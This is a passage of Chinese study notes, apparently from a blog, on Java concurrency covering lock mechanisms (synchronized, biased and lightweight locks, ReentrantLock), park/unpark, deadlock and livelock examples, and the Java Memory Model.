<h5 id="3-1-成员变量和静态变量"><a href="#3-1-成员变量和静态变量" class="headerlink" title="3.1 成员变量和静态变量"></a>3.1 成员变量和静态变量</h5><ul>
<li>如果没有被共享，则线程安全</li>
<li>如果被共享<ul>
<li>只有读操作，则线程安全</li>
<li>有读写操作，则这段代码是临界区，需要考虑线程安全</li>
</ul>
</li>
</ul>
<h5 id="3-2-局部变量"><a href="#3-2-局部变量" class="headerlink" title="3.2 局部变量"></a>3.2 局部变量</h5><ul>
<li>局部变量是线程安全,没有被共享</li>
<li>局部变量引用的对象则未必<ul>
<li>如果该对象没有逃离方法的作用范围，是线程安全</li>
<li>如果该对象逃离<strong>方法的作用范围</strong>，需要考虑线程安全  （return）</li>
</ul>
</li>
</ul>
<h5 id="3-3-常见线程安全类-不可变类"><a href="#3-3-常见线程安全类-不可变类" class="headerlink" title="3.3 常见线程安全类(不可变类)"></a>3.3 常见线程安全类(不可变类)</h5><p>vector、HashTable、Random、String、Integer、StringBuffer</p>
<blockquote>
<p>多个线程调用它们同一个实例的某个方法时，是线程安全的</p>
</blockquote>
<ul>
<li>它们每个方法是原子的</li>
<li>多个方法的组成不是原子的</li>
</ul>
<blockquote>
<p><strong>不可变类线程安全性</strong>:（String、Integer…）因为其内部的状态不可以改变，因此它们的方法都是线程安全。</p>
</blockquote>
<ul>
<li>String类中replace内部是创建新的String实例，并没有对状态进行改变</li>
</ul>
<h4 id="4、-Monitor-锁"><a href="#4、-Monitor-锁" class="headerlink" title="4、*Monitor(锁)"></a>4、*Monitor(锁)</h4><blockquote>
<p>操作系统提供的Monitor锁</p>
</blockquote>
<h5 id="4-1-java对象头"><a href="#4-1-java对象头" class="headerlink" title="4.1 java对象头"></a>4.1 java对象头</h5><blockquote>
<p>Mark Word：hashcode(hash地址)、bisased_lock偏向锁状态、01表示锁状态</p>
<p>Klass Word：表示对象从属的类</p>
</blockquote>
<img src="https://csn.damyoung.cn/image-20201002235120076.png" alt="image-20201002235120076" style="zoom:80%;" />

<img src="https://csn.damyoung.cn/image-20201002235454295.png" alt="image-20201002235454295" style="zoom:80%;" />

<img src="https://csn.damyoung.cn/image-20201002234814861.png" alt="image-20201002234814861" style="zoom:80%;" />

<ul>
<li>biased_lock：1表示开启偏向锁</li>
</ul>
<h5 id="4-2-Monitor"><a href="#4-2-Monitor" class="headerlink" title="4.2 Monitor"></a>4.2 Monitor</h5><p><strong>Synchronized底层原理</strong></p>
<blockquote>
<p>监视器/管程(操作系统)</p>
<p>WaitSet(等待池)、Owner、EntryList(未获得过锁线程)</p>
</blockquote>
<h5 id="4-3-wait原理"><a href="#4-3-wait原理" class="headerlink" title="4.3 wait原理"></a>4.3 wait原理</h5><img src="https://csn.damyoung.cn/image-20201002175837645.png" alt="image-20201002175837645" style="zoom: 80%;" />

<ul>
<li>Owner线程发现条件不满足，调用wait()，即可进入WaitSet进入WAITING状态</li>
<li>BLOCKED(未获得过锁的线程)与WAITING(调用wait方法)线程<strong>都处于阻塞状态</strong>，<strong>不占用CPU时间片</strong><ul>
<li>BLOCKED线程在Owner线程释放锁时唤醒</li>
<li>Waiting线程在Owner线程调用notify/notifyAll时唤醒，但仍进入EntryList条件变量中重新竞争</li>
</ul>
</li>
</ul>
<h4 id="5、-锁优化"><a href="#5、-锁优化" class="headerlink" title="5、**锁优化"></a>5、**锁优化</h4><blockquote>
<p>JVM层面对对象锁的优化</p>
<p>Synchronized是重量级锁(Monitor)、悲观锁、可重入锁、非公平锁</p>
<p>​    不可打断</p>
</blockquote>
<h5 id="5-1-自旋锁"><a href="#5-1-自旋锁" class="headerlink" title="5.1 自旋锁"></a>5.1 自旋锁</h5><blockquote>
<p>互斥同步进入阻塞状态的开销都很大，应该尽量避免，在许多应用中，共享数据的锁定状态只会持续很短的一段时间</p>
<p>自旋锁的思想是让一个线程在请求一个共享数据的锁时执行忙循环（自旋）一段时间，如果在这段时间内能获得锁，就可以避免进入阻塞状态</p>
<p>自旋锁虽然能避免进入阻塞状态从而减少开销，但是它需要进行忙循环操作占用 CPU 时间，它只适用于共享数据的锁定状态很短的场景。</p>
<p>JDK 1.6 中引入了自适应的自旋锁。自适应意味着自旋的次数不再固定了，而是由前一次在同一个锁上的自旋次数及锁的拥有者的状态来决定。</p>
</blockquote>
<h5 id="5-2-锁消除"><a href="#5-2-锁消除" class="headerlink" title="5.2 锁消除"></a>5.2 锁消除</h5><blockquote>
<p>锁消除是指对于被检测出不可能存在竞争的共享数据的锁进行消除。</p>
<p>锁消除主要是通过<strong>逃逸分析</strong>来支持，如果堆上的共享数据不可能逃逸出去被其它线程访问到，那么就可以把它们当成<strong>私有数据</strong>对待，也就可以将它们的<strong>锁进行消除</strong>。</p>
</blockquote>
<p><code>String</code>是一个不可变的类，字符串拼接代码就隐式加了锁，编译器会对<code>String</code>的拼接自动优化。在JDK1.5之前，会转化为<code>StringBuffer</code>对象的连续<code>append()</code>操作。</p>
<blockquote>
<p>现在使用<code>StringBuilder</code>,线程不安全，效率高</p>
</blockquote>
<p>每个<code>append()</code>方法中都有一个同步块。</p>
<p>虚拟机观察变量<code>sb</code>，很快就会发现它的动态作用域被限制在<code>concatString()</code>方法内部。</p>
<p>也就是说，<code>sb</code>的所有引用永远不会逃逸到<code>concatString()</code>方法之外，其他线程无法访问到它，因此可以进行消除。</p>
<h5 id="5-3-锁粗化"><a href="#5-3-锁粗化" class="headerlink" title="5.3 锁粗化"></a>5.3 锁粗化</h5><blockquote>
<p>如果一系列的连续操作都对同一个对象反复加锁和解锁，频繁的加锁操作就会导致性能损耗。</p>
</blockquote>
<p>上一节的示例代码中连续的<code>append()</code>方法就属于这类情况。如果虚拟机探测到由这样的一串零碎的操作都对同一个对象加锁，将会把加锁的范围扩展（粗化）到整个操作序列的外部。</p>
<p>对于上一节的示例代码就是扩展到第一个<code>append()</code>操作之前直至最后一个<code>append()</code>操作之后，这样只需要加锁一次就可以了。</p>
<h5 id="5-4-轻量级锁"><a href="#5-4-轻量级锁" class="headerlink" title="5.4 轻量级锁"></a>5.4 轻量级锁</h5><blockquote>
<ul>
<li><p>如果一个对象虽然有多线程访问，但多线程访问的时间是错开的(没有竞争)，那么可以轻量级锁优化</p>
</li>
<li><p>对使用者是透明的，语法仍然是Synchronized</p>
</li>
<li><p>但每次发生锁重入时，还是需要进行CAS操作</p>
</li>
</ul>
</blockquote>
<h5 id="5-5-锁膨胀"><a href="#5-5-锁膨胀" class="headerlink" title="5.5 锁膨胀"></a>5.5 锁膨胀</h5><blockquote>
<p>在尝试加轻量级锁时，CAS操作无法成功，这时一种情况就是有其他线程为此对象加上了轻量级锁(有竞争),这时需要进行锁膨胀，将轻量级锁变为重量级锁。</p>
</blockquote>
<h5 id="5-6-偏向锁"><a href="#5-6-偏向锁" class="headerlink" title="5.6 偏向锁"></a>5.6 偏向锁</h5><blockquote>
<p>轻量级锁在没有竞争时，每次重入都需要执行CAS操作</p>
<p>偏向锁优化：只有第一次使用CAS将线程ID设置到对象的Mark Word头，之后发现这个线程ID是自己的就表示没有竞争。</p>
<p>​                        不用重新CAS。以后只要不发生竞争，这个对象就归该线程所有。</p>
</blockquote>
<h6 id="5-6-1-撤销偏向锁"><a href="#5-6-1-撤销偏向锁" class="headerlink" title="5.6.1 撤销偏向锁"></a>5.6.1 撤销偏向锁</h6><ul>
<li>1-调用对象的Id,但偏向锁的对象MarkWord中存储的是线程Id。如果调用hashcode会导致偏向锁被撤销</li>
<li>2-其他线程使用偏向锁对象，会将偏向锁升级为轻量级锁</li>
</ul>
<h6 id="5-6-2-批量重偏向"><a href="#5-6-2-批量重偏向" class="headerlink" title="5.6.2 批量重偏向"></a>5.6.2 批量重偏向</h6><ul>
<li>对象被多个线程访问，但没有竞争，这时偏向了线程T1的对象仍有机会重新偏向T2，重偏向会重置对象的线程Id</li>
<li>当撤销偏向锁阈值超过20次，会在这些对象加锁时重新偏向至加锁线程。</li>
</ul>
<h6 id="5-6-3-批量撤销"><a href="#5-6-3-批量撤销" class="headerlink" title="5.6.3 批量撤销"></a>5.6.3 批量撤销</h6><p>当撤销偏向锁阈值超过40次后，jvm发现不该偏向，于是整个类的所有对象都会变成不可偏向，<strong>新建的对象也是不可偏向。</strong></p>
<h4 id="6、Park-amp-Unpark"><a href="#6、Park-amp-Unpark" class="headerlink" title="6、Park&amp;Unpark"></a>6、Park&amp;Unpark</h4><blockquote>
<p>LockSupport工具类</p>
<ul>
<li><p>LockSupport.park() 暂停当前线程</p>
</li>
<li><p>LockSupport.unpark(暂停线程对象)   恢复某个线程的运行</p>
</li>
</ul>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Thread t=<span class="keyword">new</span> Thread(()-&gt;&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Thread.sleep(<span class="number">2</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    LockSupport.park();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">Thread.sleep(<span class="number">2</span>);</span><br><span class="line"><span class="comment">//将线程作为形参</span></span><br><span class="line">LockSupport.unpark(t);</span><br></pre></td></tr></table></figure>

<h5 id="park-vs-wait"><a href="#park-vs-wait" class="headerlink" title="park vs wait"></a>park vs wait</h5><ul>
<li>park/unpark以<strong>线程为单位来！！！</strong>【阻塞】【唤醒】线程，而notify是随机唤醒某个线程，不精确</li>
<li>wait必须配合Object Monitor来使用，而park没有这个限制</li>
<li><strong>park( __counter=0)之前可以先unpark(设置_counter=1), wait之前不能先notify</strong></li>
</ul>
<h4 id="7、-Reentrantlock"><a href="#7、-Reentrantlock" class="headerlink" title="7、**Reentrantlock"></a>7、**Reentrantlock</h4><img src="https://csn.damyoung.cn/image-20201007164306417.png" alt="image-20201007164306417" style="zoom:67%;" />

<blockquote>
<p>是在对象级别的锁。而Synchronized是以关键字形式(直接操作Monitor)</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//获取锁</span></span><br><span class="line">reentrantLock.lock();</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="comment">//临界区</span></span><br><span class="line">&#125;<span class="keyword">finally</span>&#123;</span><br><span class="line">    reentrantLock.unlock();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="7-1-可重入"><a href="#7-1-可重入" class="headerlink" title="7.1 可重入"></a>7.1 可重入</h5><blockquote>
<p>可重入指同一个线程如果首次获得这把锁，那么它是这把锁的拥有者，因此有权力再次获得该锁。</p>
<p>Synchronized和ReentrantLock都是可重入锁</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Lock lock=<span class="keyword">new</span> ReentrantLock();</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    lock.lock();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        m1();</span><br><span class="line">        System.out.println(<span class="string">&quot;main&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">        lock.unlock();</span><br><span class="line">        System.out.println(<span class="string">&quot;finally&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">m1</span><span class="params">()</span></span>&#123;</span><br><span class="line">    lock.lock();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;m1&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">        lock.unlock();</span><br><span class="line">        System.out.println(<span class="string">&quot;m1Finally&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="7-2-可打断"><a href="#7-2-可打断" class="headerlink" title="7.2 可打断"></a>7.2 可打断</h5><blockquote>
<ul>
<li><p>默认为不可打断模式<code>-见2.5interrupt</code></p>
</li>
<li><p>可打断模式调用<code>lock.lockInterruptibly</code>-通过抛出异常实现</p>
</li>
</ul>
<img src="https://csn.damyoung.cn/image-20201007191014931.png" alt="image-20201007191014931" style="zoom:67%;" />

<p>指线程可以被其他线程调用<code>interrupt()</code>打断。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Thread thread = <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;thread&quot;</span>);</span><br><span class="line">        <span class="comment">//设置lock为可打断</span></span><br><span class="line">        <span class="comment">//如果没有竞争那么此方法会获取Lock对象锁</span></span><br><span class="line">        <span class="comment">//如果有竞争进入阻塞队列，可以被其他线程用interrupt打断</span></span><br><span class="line">        lock.lockInterruptibly();</span><br><span class="line">    &#125;<span class="keyword">catch</span> (InterruptedException e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        System.out.println(<span class="string">&quot;中断异常&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;获得到锁&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">        lock.unlock();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">lock.lock();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">//开启thread线程</span></span><br><span class="line">    thread.start();</span><br><span class="line"></span><br><span class="line">    Thread.sleep(<span class="number">1</span>);</span><br><span class="line">    System.out.println(<span class="string">&quot;打断thread&quot;</span>);</span><br><span class="line">    <span class="comment">//打断thread线程</span></span><br><span class="line">    thread.interrupt();</span><br><span class="line">&#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">    lock.unlock();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="7-3-锁超时"><a href="#7-3-锁超时" class="headerlink" title="7.3 锁超时"></a>7.3 锁超时</h5><blockquote>
<p>设置时间，使得在阻塞队列中立即失败</p>
<p><code>tryLock</code>的方法就是试一下，如果能得到锁，就返回true，如果当时得不到，马上就返回false，绝不等。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Thread thread=<span class="keyword">new</span> Thread(()-&gt;&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;尝试获得锁&quot;</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!lock.tryLock(<span class="number">1</span>, TimeUnit.SECONDS))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;获取不到锁&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;获得到锁&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">        lock.unlock();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">lock.lock();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;主线程&quot;</span>);</span><br><span class="line">    thread.start();</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    Thread.sleep(<span class="number">3000</span>);</span><br><span class="line">    lock.unlock();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="7-4-非公平锁"><a href="#7-4-非公平锁" class="headerlink" title="7.4 非公平锁"></a>7.4 非公平锁</h5><blockquote>
<p>公平锁：是指多个线程按照申请锁的顺序来获取锁</p>
<p>非公平锁：是指多个线程获取锁的顺序并不是按照申请锁的顺序，有可能后申请的线程优先获取锁</p>
</blockquote>
<blockquote>
</blockquote>
<h5 id="7-5-条件变量condition-await"><a href="#7-5-条件变量condition-await" class="headerlink" title="7.5 条件变量condition/await"></a>7.5 条件变量condition/await</h5><blockquote>
<ul>
<li>Condition类是来实现线程之间的协调关系</li>
<li>每个条件变量对应一个<strong>等待队列</strong>，其实现类是<code>ConditionObject</code>(AQS内部类，继承与Condition)</li>
</ul>
<img src="https://csn.damyoung.cn/image-20201007230023942.png" alt="image-20201007230023942" style="zoom:67%;" />

<p>条件变量：Synchronized的WaitSet，但Synchronized只支持一个</p>
<ul>
<li>ReentrantLock支持多个条件变量<ul>
<li>await前需要获得锁，执行后会释放锁，进入ConditionObject等待</li>
<li>await线程被唤醒(或打断、或超时)，重新竞争lock锁</li>
</ul>
</li>
</ul>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//条件变量2个</span></span><br><span class="line">Condition condition1 = lock.newCondition();</span><br><span class="line">Condition condition2 = lock.newCondition();</span><br><span class="line"></span><br><span class="line">lock.lock();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">//进入condition1等待</span></span><br><span class="line">    condition1.await();</span><br><span class="line">    <span class="comment">//唤醒condition1中的线程</span></span><br><span class="line">    condition1.signal();</span><br><span class="line">    condition1.signalAll();</span><br><span class="line">&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">    lock.unlock();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>可以在<code>Condition</code>上调用<code>await()</code>方法使线程等待，其它线程调用<code>signal()</code>或<code>signalAll()</code>方法唤醒等待的线程。</p>
<p>相比于<code>wait()</code>这种等待方式，<code>await()</code>可以指定等待的条件，因此更加灵活。</p>
</blockquote>
<h5 id="7-6-Synchronized-vs-ReentrantLock"><a href="#7-6-Synchronized-vs-ReentrantLock" class="headerlink" title="7.6 Synchronized vs ReentrantLock"></a>7.6 Synchronized vs ReentrantLock</h5><ul>
<li><strong>两者都是可重入锁</strong></li>
<li><code>synchronized</code>是JVM实现的，<code>ReentrantLock</code>是JDK实现的</li>
<li>新版本的<code>synchronized</code>进行了很多优化，例如自旋锁，<code>synchronized</code>与<code>ReentrantLock</code>大致相同。</li>
<li>当持有锁的线程长期不释放锁的时候，正在等待的线程可以选择放弃等待，改为处理其他事情。 <strong><code>ReentrantLock</code>可中断（通过<code>lock.lockInterruptibly()</code>来实现），而<code>synchronized</code>不行</strong>。</li>
<li><code>synchronized</code>中的锁是非公平的，<code>ReentrantLock</code>默认情况下也是非公平的，但是也可以是公平的（通过<code>ReentrantLock</code>类的<code>ReentrantLock(boolean fair)</code>。</li>
<li>一个<code>ReentrantLock</code>可以同时绑定多个<code>Condition</code>对象（绑定多个条件）,从而可以有选择性的进行线程通知，在调度线程上更加灵活。在使用<code>notify()/notifyAll()</code>方法进行通知时，被通知的线程是由 JVM 选择的，用<code>ReentrantLock</code>类结合<code>Condition</code>实例可以实现“选择性通知”。</li>
</ul>
<blockquote>
<p>除非需要使用<code>ReentrantLock</code>的高级功能，否则优先使用<code>synchronized</code>。这是因为<code>synchronized</code>是 JVM 实现的一种锁机制，JVM 原生地支持它，而<code>ReentrantLock</code>不是所有的 JDK 版本都支持。并且使用<code>synchronized</code>不用担心没有释放锁而导致死锁问题，因为 JVM 会确保锁的释放。</p>
</blockquote>
<h4 id="8、多把锁"><a href="#8、多把锁" class="headerlink" title="8、多把锁"></a>8、多把锁</h4><blockquote>
<p>俩个不相干线程使用同一把锁会影响并发度</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BigRoom</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object studyRoom=<span class="keyword">new</span> Object();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object sleepRoom=<span class="keyword">new</span> Object();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sleep</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (sleepRoom)&#123;</span><br><span class="line">            Thread.sleep(<span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">study</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (studyRoom)&#123;</span><br><span class="line">            Thread.sleep(<span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="9、线程活跃性"><a href="#9、线程活跃性" class="headerlink" title="9、线程活跃性"></a>9、线程活跃性</h4><h5 id="9-1-死锁"><a href="#9-1-死锁" class="headerlink" title="9.1 死锁"></a>9.1 死锁</h5><blockquote>
<p>俩个或以上的线程在执行过程中，需要获得多把锁，这时容易发生死锁</p>
<p><strong>这种因线程之间争夺资源而互相等待的现象，需要外力推动</strong></p>
<p>解决：多种锁不能嵌套</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//死锁演示</span></span><br><span class="line"><span class="keyword">synchronized</span> (Product.class)&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;卖家有货，等待买家交钱&quot;</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">        <span class="keyword">synchronized</span> (Money.class)&#123;</span><br><span class="line">    		System.out.println(<span class="string">&quot;卖家获得钱，交出货物&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//解决</span></span><br><span class="line"><span class="keyword">synchronized</span> (Money.class)&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;买家有钱，等待卖家交货&quot;</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        sleep(<span class="number">1000</span>);    <span class="comment">//睡眠，让出CPU资源</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">synchronized</span> (Product.class)&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;买家获得货物，钱交给卖家&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="定位死锁"><a href="#定位死锁" class="headerlink" title="定位死锁"></a>定位死锁</h6><ul>
<li>jconsole工具</li>
<li>jps定位进程</li>
</ul>
<h5 id="9-2-活锁"><a href="#9-2-活锁" class="headerlink" title="9.2 活锁"></a>9.2 活锁</h5><blockquote>
<p><strong>俩个线程互相改变对方的结束条件，最后谁也无法结束</strong></p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">volatile</span> <span class="keyword">int</span> a=<span class="number">10</span>;</span><br><span class="line"><span class="keyword">new</span> Thread(()-&gt;&#123;</span><br><span class="line">    <span class="keyword">while</span> (a&gt;<span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(<span class="number">200</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        a--;</span><br><span class="line">        System.out.println(a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;).start();</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Thread(()-&gt;&#123;</span><br><span class="line">   <span class="keyword">while</span> (a&lt;<span class="number">20</span>)&#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           Thread.sleep(<span class="number">200</span>);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">       &#125;</span><br><span class="line">       a++;</span><br><span class="line">       System.out.println(a);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;).start();</span><br></pre></td></tr></table></figure>



<h5 id="9-1-饥饿"><a href="#9-1-饥饿" class="headerlink" title="9.1 饥饿"></a>9.1 饥饿</h5><blockquote>
<p>在公平锁中，由于优先级太低，始终无法得到CPU调度执行，也不能结束，<strong>造成“饥饿”现象</strong></p>
</blockquote>
<h3 id="四、内存模型"><a href="#四、内存模型" class="headerlink" title="四、内存模型"></a>四、内存模型</h3><h4 id="1、Java内存模型"><a href="#1、Java内存模型" class="headerlink" title="1、Java内存模型"></a>1、<strong>Java内存模型</strong></h4><h5 id="1-1-概念"><a href="#1-1-概念" class="headerlink" title="1.1 概念"></a>1.1 概念</h5><blockquote>
<p><strong>多线程下Java代码的执行顺序，共享变量的读写！！！</strong></p>
</blockquote>
<blockquote>
<p>JMM即Java Memory Model，从属于JVM，定义了主存、工作内存抽象概念，底层对应着CPU寄存器、缓存、硬件内存、CPU指令优化等.</p>
<p>JMM试图屏蔽各种硬件和操作系统的内存差异，使得java代码在各种平台都达到一致的内存访问效果</p>
</blockquote>
<blockquote>
<p>共享变量会先放在主存中，每个线程都有属于自己的工作内存，并且会把位于主存中的共享变量拷贝到自己的工作内存</p>
<p>之后的读写操作均使用位于工作内存的变量副本，并在某个时刻将工作内存的变量副本写回到主存中去。</p>
<p>线程只能操作自己工作内存中的变量，不同线程之间的变量值传递需要通过主内存来完成</p>
</blockquote>
<h5 id="1-2-三大特性"><a href="#1-2-三大特性" class="headerlink" title="1.2 三大特性"></a>1.2 三大特性</h5><blockquote>
<ul>
<li>原子性-保证指令不会受到<strong>线程上下文切换</strong>的影响</li>
<li>可见性-保证指令不会受到Cpu<strong>缓存</strong>的影响</li>
<li>有序性-保证指令不会受到CPU<strong>指令并行优化</strong>的影响</li>
</ul>
</blockquote>
<h6 id="1-1-可见性"><a href="#1-1-可见性" class="headerlink" title="1.1 可见性"></a>1.1 可见性</h6><blockquote>
<p><strong>可见性：当一个线程修改了共享变量后，其他线程能够立即得知这个修改。</strong></p>
<ul>
<li><p>当多个线程操作共享变量时，一个CPU中的线程读取主存数据到<strong>CPU缓存</strong>，然后对共享对象做了更改。</p>
</li>
<li><p>但CPU缓存中的更改后的对象还没有flush到主存，此时<strong>线程对共享对象的更改对其它CPU中的线程是不可见的</strong>。 </p>
</li>
<li><p>最终就是每个线程最终都会拷贝共享对象，而且拷贝的对象位于不同的CPU缓存中</p>
</li>
</ul>
</blockquote>
<p><strong>解决</strong></p>
<blockquote>
<ul>
<li>使用<strong>volatile(易变)**关键字，保证变量会</strong>直接从主存读取<strong>，而对变量的</strong>更新也会直接写到主存**(轻量)</li>
<li>使用Synchronized保证临界区代码的原子性，也会在释放锁前将变量直接写入主存中，保证可见性(调用Monitor,重量)</li>
<li><code>final</code>:被<code>final</code>关键字修饰的字段在构造器中一旦初始化完成，并且没有发生<code>this</code>逃逸（其他线程通过<code>this</code>引用访问到初始化一半的对象），那么其他线程就能看见<code>final</code>字段的值。</li>
</ul>
</blockquote>
<h6 id="1-3-原子性"><a href="#1-3-原子性" class="headerlink" title="1.3 原子性"></a>1.3 原子性</h6><blockquote>
<p><strong>原子性：一个操作是不可中断，要么全部执行成功要么全部执行失败</strong></p>
<ul>
<li><p>volatile不能保证原子性，<strong>不能保证指令交错</strong>，仅适合用于一个写线程，多个读线程。</p>
</li>
<li><p>Synchronized保证临界区代码避免发生竞态条件</p>
</li>
</ul>
</blockquote>
<h6 id="1-4-有序性"><a href="#1-4-有序性" class="headerlink" title="1.4 有序性"></a>1.4 有序性</h6><blockquote>
<p><strong>有序性：是指程序执行的顺序按照代码的先后顺序执行。</strong></p>
<p>CPU会对<strong>无依赖关系指令</strong>进行重排序优化</p>
<ul>
<li>volatile可以禁止指令重排序</li>
<li>也可以通过<code>synchronized</code>来保证有序性，它保证每个时刻只有一个线程执行同步代码，相当于是让线程顺序执行同步代码。典型的应用是双重检查锁实现的单例模式。</li>
</ul>
</blockquote>
<h5 id="1-3-内存间的交互操作"><a href="#1-3-内存间的交互操作" class="headerlink" title="1.3 内存间的交互操作"></a>1.3 内存间的交互操作</h5><blockquote>
<p>Java 内存模型定义了 8 个操作来完成主内存和工作内存的交互操作：</p>
</blockquote>
<img src="https://github.com/CyC2018/CS-Notes/raw/master/notes/pics/8b7ebbad-9604-4375-84e3-f412099d170c.png" alt="内存交互操作" style="zoom:80%;" />

<ul>
<li><code>read</code>:把一个变量的值从主内存传输到工作内存中</li>
<li><code>load</code>:在<code>read</code>之后执行，把<code>read</code>得到的值放入工作内存的变量副本中</li>
<li><code>use</code>:把工作内存中一个变量的值传递给执行引擎</li>
<li><code>assign</code>:把一个从执行引擎接收到的值赋给工作内存的变量</li>
<li><code>store</code>:把工作内存的一个变量的值传送到主内存中</li>
